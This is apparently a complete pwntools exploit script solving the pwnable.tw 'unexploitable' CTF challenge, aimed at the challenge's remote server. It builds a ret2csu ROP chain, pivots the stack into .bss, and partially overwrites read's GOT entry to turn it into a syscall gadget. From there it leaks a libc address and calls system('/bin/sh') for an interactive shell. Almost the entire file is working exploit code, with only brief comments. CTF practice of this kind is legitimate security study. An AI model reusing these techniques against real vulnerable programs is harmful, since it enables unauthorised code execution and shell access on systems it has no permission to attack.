from pwn import *
#io = process('./unexploitable')
io = remote('chall.pwnable.tw', 10403)
elf = ELF('./unexploitable')
pause()
context.log_level = 'debug'

#common gadgets in x86_64 ELF
#.text:00000000004005D0 loc_4005D0:                             ; CODE XREF: __libc_csu_init+64j
#.text:00000000004005D0                 mov     rdx, r15
#.text:00000000004005D3                 mov     rsi, r14
#.text:00000000004005D6                 mov     edi, r13d
#.text:00000000004005D9                 call    qword ptr [r12+rbx*8]
#.text:00000000004005DD                 add     rbx, 1
#.text:00000000004005E1                 cmp     rbx, rbp
#.text:00000000004005E4                 jnz     short loc_4005D0
#.text:00000000004005E6
#.text:00000000004005E6 loc_4005E6:                             ; CODE XREF: __libc_csu_init+48j
#.text:00000000004005E6                 mov     rbx, [rsp+38h+var_30]
#.text:00000000004005EB                 mov     rbp, [rsp+38h+var_28]
#.text:00000000004005F0                 mov     r12, [rsp+38h+var_20]
#.text:00000000004005F5                 mov     r13, [rsp+38h+var_18]
#.text:00000000004005FA                 mov     r14, [rsp+38h+var_10]
#.text:00000000004005FF                 mov     r15, [rsp+38h+var_8]
#.text:0000000000400604                 add     rsp, 38h
#.text:0000000000400608                 retn

part1 = 0x4005e6
part2 = 0x4005d0

ret = 0x400417
pop_rbp_ret = 0x0000000000400512
leave_ret = 0x0000000000400576
read_plt = elf.plt['read']
bss = 0x601018
read_got = elf.got['read']
sleep_got = elf.got['sleep']

def call_function(call_addr, arg1, arg2, arg3):
	payload = ''
	payload += p64(part1) #=>RSP
	payload += 'a' * 8
	payload += p64(0) #=>RBX
	payload += p64(1) #=>RBP
	payload += p64(call_addr) #=>R12=>RIP
	payload += p64(arg1) #=>R13=>RDI
	payload += p64(arg2) #=>R14=>RSI
	payload += p64(arg3) #=>R15=>RDX
	payload += p64(part2)
	payload += 'b' * 0x38
	return payload	

#step 1, read 0x200 to bss and ret to it
payload = 'a' * 0x18
payload += call_function(read_got, 0, bss, 0x300)
payload += p64(pop_rbp_ret)
payload += p64(bss)
payload += p64(leave_ret)
io.sendline(payload)
pause()

#step 2, use read to got to change the lst byte of read_libc, and use syscall to leak addr
#then use sleep to make rax = 0
#then read to bss again and ret to it
payload2 = 'b' * 8
payload2 += call_function(read_got, 0, read_got, 1) #call read to change the last byte of read_libc to '\x7e', now the read_got becomes syscall
payload2 += call_function(read_got, 1, sleep_got, 8)#use syscall(write) to leak sleep_libc
payload2 += call_function(sleep_got, 0, 0, 0)
payload2 += call_function(read_got, 0, bss + 0x300, 0x200)
payload2 += p64(pop_rbp_ret)
payload2 += p64(bss + 0x300)
payload2 += p64(leave_ret)
io.send(payload2)
pause()

io.send('\x7e')
pause()

sleep_libc = u64(io.recvn(8))
log.info('sleep_libc :' + hex(sleep_libc))
l = ELF('./libc_64.so.6')
libc_main = sleep_libc - l.symbols['sleep']
system_libc = libc_main + l.symbols['system']
log.info('system_libc :' + hex(system_libc))
binsh = libc_main + l.search('/bin/sh\x00').next()
log.info('binsh :' + hex(binsh))
pop_rdi_ret = libc_main + 0x0000000000021102 

payload3 = p64(bss + 0x400) 
payload3 += p64(pop_rdi_ret)
payload3 += p64(binsh)
payload3 += p64(system_libc)
io.send(payload3)

io.interactive()

